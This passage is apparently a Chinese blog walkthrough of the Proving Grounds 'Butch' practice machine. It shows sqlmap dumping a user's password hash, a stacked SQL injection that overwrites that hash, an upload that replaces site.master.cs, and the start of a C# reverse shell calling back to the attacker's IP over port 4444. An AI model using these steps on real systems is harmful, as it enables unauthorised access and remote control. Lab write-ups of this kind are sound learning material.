+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Butch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sqlmap -r sqli.txt --level<span class="o">=</span><span class="m">3</span> --risk<span class="o">=</span><span class="m">3</span> -D butch -T users -C <span class="s1">&#39;password_hash&#39;</span>,<span class="s1">&#39;username&#39;</span> --technique<span class="o">=</span>T --dbms<span class="o">=</span>mssql --dump --batch
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl"><span class="o">[</span>18:08:47<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> no clear password<span class="o">(</span>s<span class="o">)</span> found                                                         
+</span></span><span class="line"><span class="cl">Database: butch
+</span></span><span class="line"><span class="cl">Table: users
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+------------------------------------------------------------------+----------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> password_hash                                                    <span class="p">|</span> username <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------------------------------------------------+----------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 <span class="p">|</span> butch    <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------------------------------------------------+----------+
+</span></span><span class="line"><span class="cl">……</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Butch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hashid e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267     
+</span></span><span class="line"><span class="cl">Analyzing <span class="s1">&#39;e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Snefru-256 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SHA-256 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> RIPEMD-256 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Haval-256 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> GOST R 34.11-94 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> GOST CryptoPro S-Box 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SHA3-256 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Skein-256 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Skein-512<span class="o">(</span>256<span class="o">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>尝试破解Hash失败。</p>
+<blockquote>
+<p>做完题后看了官方walkthrough，这里是通过sqlmap破解的密码Hash，不太明白怎么做到的。</p>
+<blockquote>
+<p>Since the output contained a password hash, <code>sqlmap</code> offers to attempt to crack the hash with a common wordlist. We&rsquo;ll respond with <code>Y</code> or <code>yes</code> to proceed.</p>
+<p>The attempt is successful, revealing a password of <code>awesomedude</code>. We can successfully authenticate to the web app with this password.</p>
+</blockquote>
+<p>我本地的结果是没有跑出来的</p>
+<p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212210817069.png" alt="image-20240212210817069" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212210817069.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212210817069.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212210817069.png?size=large 2x" data-title="image-20240212210817069" style="--width: 855px;--aspect-ratio: 855 / 489;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</blockquote>
+<p>这时候的另一种方法，就是通过SQL注入修改数据库。</p>
+<p>重新设置一个密码，计算其sha256的值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Butch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> <span class="s1">&#39;123456&#39;</span> <span class="p">|</span> sha256sum 
+</span></span><span class="line"><span class="cl">e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0  -</span></span></code></pre></td></tr></table>
+</div>
+</div><p>插入新记录失败</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">password_hash</span><span class="p">,</span><span class="n">user_id</span><span class="p">,</span><span class="n">username</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0&#39;</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;test&#39;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改原有记录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">password_hash</span><span class="o">=</span><span class="s1">&#39;e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;butch&#39;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>还是失败了，错误原因是<code>echo '123456'</code>这一步不对，echo默认情况下的输出是带有换行符的，导致计算的结果hash与预期不符。</p>
+<p>重新计算Hash，再次修改原有记录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Butch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> -n <span class="s1">&#39;123456&#39;</span> <span class="p">|</span> sha256sum
+</span></span><span class="line"><span class="cl">8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92  -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;</span>UPDATE users SET <span class="nv">password_hash</span><span class="o">=</span><span class="s1">&#39;8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92&#39;</span> WHERE <span class="nv">username</span><span class="o">=</span><span class="s1">&#39;butch&#39;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212184704451.png" alt="image-20240212184704451" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212184704451.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212184704451.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212184704451.png?size=large 2x" data-title="image-20240212184704451" style="--width: 628px;--aspect-ratio: 628 / 263;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>使用<code>butch/123456</code>成功登录Web后台，发现是个后台上传功能。</p>
+<p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212184752955.png" alt="image-20240212184752955" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212184752955.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212184752955.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212184752955.png?size=large 2x" data-title="image-20240212184752955" style="--width: 951px;--aspect-ratio: 951 / 655;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="文件上传" class="heading-element"><span>文件上传</span>
+  <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>正常情况下的文件上传功能点的思路就是上传webshell，或者覆盖某些配置文件。这里apsx等可执行文件后缀无法上传，Webshell思路走不通。配置文件这块又不太了解。</p>
+<p>补充一下，通过上传txt等测试文件，最后在Web根目录下找到了这些文件，确认了这些文件的上传位置。</p>
+<p>接下去的知识点都是新学的</p>
+<p>Web服务下有个dev目录，包含了一个site.master.txt文件，疑似是源码的一个备份</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="p">&lt;%</span><span class="err">@</span> <span class="n">Language</span><span class="p">=</span><span class="s">&#34;C#&#34;</span> <span class="n">src</span><span class="p">=</span><span class="s">&#34;site.master.cs&#34;</span> <span class="n">Inherits</span><span class="p">=</span><span class="s">&#34;MyNamespaceMaster.MyClassMaster&#34;</span> <span class="p">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span> <span class="n">PUBLIC</span> <span class="s">&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span class="s">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">html</span> <span class="n">xmlns</span><span class="p">=</span><span class="s">&#34;http://www.w3.org/1999/xhtml&#34;</span> <span class="n">lang</span><span class="p">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="n">head</span> <span class="n">runat</span><span class="p">=</span><span class="s">&#34;server&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">title</span><span class="p">&gt;</span><span class="n">Butch</span><span class="p">&lt;/</span><span class="n">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="p">-</span><span class="n">equiv</span><span class="p">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="p">=</span><span class="s">&#34;application-name&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;Butch&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="p">=</span><span class="s">&#34;author&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;Butch&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="p">=</span><span class="s">&#34;description&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;Butch&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="p">=</span><span class="s">&#34;keywords&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;Butch&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">link</span> <span class="n">media</span><span class="p">=</span><span class="s">&#34;all&#34;</span> <span class="n">href</span><span class="p">=</span><span class="s">&#34;style.css&#34;</span> <span class="n">rel</span><span class="p">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="n">type</span><span class="p">=</span><span class="s">&#34;text/css&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">link</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;favicon&#34;</span> <span class="n">rel</span><span class="p">=</span><span class="s">&#34;shortcut icon&#34;</span> <span class="n">type</span><span class="p">=</span><span class="s">&#34;image/png&#34;</span> <span class="n">href</span><span class="p">=</span><span class="s">&#34;favicon.png&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="n">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="n">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;wrap&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;header&#34;</span><span class="p">&gt;</span><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Butch</span> <span class="n">Repository</span><span class="p">&lt;/</span><span class="n">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;main&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">&lt;</span><span class="n">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">&lt;</span><span class="n">asp</span><span class="p">:</span><span class="n">contentplaceholder</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;ContentPlaceHolder1&#34;</span> <span class="n">runat</span><span class="p">=</span><span class="s">&#34;server&#34;</span><span class="p">&gt;&lt;/</span><span class="n">asp</span><span class="p">:</span><span class="n">contentplaceholder</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">&lt;</span><span class="n">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">&lt;/</span><span class="n">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;/</span><span class="n">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;/</span><span class="n">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="n">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">html</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>微软官方文档<a href="https://docs.microsoft.com/en-us/previous-versions/wtxbf3hh%28v=vs.140%29?redirectedfrom=MSDN"target="_blank" rel="external nofollow noopener noreferrer">site.master</a> 表明该文件为每个页面提供了一个模板在 ASP.NET MVC 风格的应用程序上。</p>
+<p>这块C#的代码不了解，只知道引入了site.master.cs，接下去的思路就是替换这个文件，让它去执行恶意命令。</p>
+<p>从这找了个demo进行上传，https://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">using System<span class="p">;</span>
+</span></span><span class="line"><span class="cl">using System.Web.UI<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">namespace WebFormsExample
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">    public partial class SiteMaster : MasterPage
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        protected void Page_Load<span class="o">(</span>object sender, EventArgs e<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212201849849.png" alt="image-20240212201849849" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212201849849.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212201849849.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212201849849.png?size=large 2x" data-title="image-20240212201849849" style="--width: 1260px;--aspect-ratio: 1260 / 883;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>上传成功后，访问首页，首页报500错误，说明至少文件是替换成功了。</p>
+<p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212201915047.png" alt="image-20240212201915047" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212201915047.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212201915047.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212201915047.png?size=large 2x" data-title="image-20240212201915047" style="--width: 976px;--aspect-ratio: 976 / 762;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里500之后好像只能重置环境，需要构造好恶意文件再上传。</p>
+<h4 id="恶意文件1" class="heading-element"><span>恶意文件1</span>
+  <a href="#%e6%81%b6%e6%84%8f%e6%96%87%e4%bb%b61" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>使用 <a href="https://github.com/0dayCTF/reverse-shell-generator"target="_blank" rel="external nofollow noopener noreferrer">reverse-shell-generator</a> 生成 C#的反弹Shell代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">using System<span class="p">;</span>
+</span></span><span class="line"><span class="cl">using System.Text<span class="p">;</span>
+</span></span><span class="line"><span class="cl">using System.IO<span class="p">;</span>
+</span></span><span class="line"><span class="cl">using System.Diagnostics<span class="p">;</span>
+</span></span><span class="line"><span class="cl">using System.ComponentModel<span class="p">;</span>
+</span></span><span class="line"><span class="cl">using System.Linq<span class="p">;</span>
+</span></span><span class="line"><span class="cl">using System.Net<span class="p">;</span>
+</span></span><span class="line"><span class="cl">using System.Net.Sockets<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">namespace ConnectBack
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">	public class Program
+</span></span><span class="line"><span class="cl">	<span class="o">{</span>
+</span></span><span class="line"><span class="cl">		static StreamWriter streamWriter<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		public static void Main<span class="o">(</span>string<span class="o">[]</span> args<span class="o">)</span>
+</span></span><span class="line"><span class="cl">		<span class="o">{</span>
+</span></span><span class="line"><span class="cl">			using<span class="o">(</span>TcpClient <span class="nv">client</span> <span class="o">=</span> new TcpClient<span class="o">(</span><span class="s2">&#34;192.168.45.164&#34;</span>, 4444<span class="o">))</span>
+</span></span><span class="line"><span class="cl">			<span class="o">{</span>
+</span></span><span class="line"><span class="cl">				using<span class="o">(</span>Stream <span class="nv">stream</span> <span class="o">=</span> client.GetStream<span class="o">())</span>
+</span></span><span class="line"><span class="cl">				<span class="o">{</span>
+</span></span><span class="line"><span class="cl">					using<span class="o">(</span>StreamReader <span class="nv">rdr</span> <span class="o">=</span> new StreamReader<span class="o">(</span>stream<span class="o">))</span>
+</span></span><span class="line"><span class="cl">					<span class="o">{</span>
+</span></span><span class="line"><span class="cl">						<span class="nv">streamWriter</span> <span class="o">=</span> new StreamWriter<span class="o">(</span>stream<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						
+</span></span><span class="line"><span class="cl">						StringBuilder <span class="nv">strInput</span> <span class="o">=</span> new StringBuilder<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						Process <span class="nv">p</span> <span class="o">=</span> new Process<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.StartInfo.FileName <span class="o">=</span> <span class="s2">&#34;powershell&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.StartInfo.CreateNoWindow <span class="o">=</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.StartInfo.UseShellExecute <span class="o">=</span> false<span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.StartInfo.RedirectStandardOutput <span class="o">=</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.StartInfo.RedirectStandardInput <span class="o">=</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.StartInfo.RedirectStandardError <span class="o">=</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.OutputDataReceived +<span class="o">=</span> new DataReceivedEventHandler<span class="o">(</span>CmdOutputDataHandler<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.Start<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						p.BeginOutputReadLine<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="k">while</span><span class="o">(</span><span class="nb">true</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">						<span class="o">{</span>
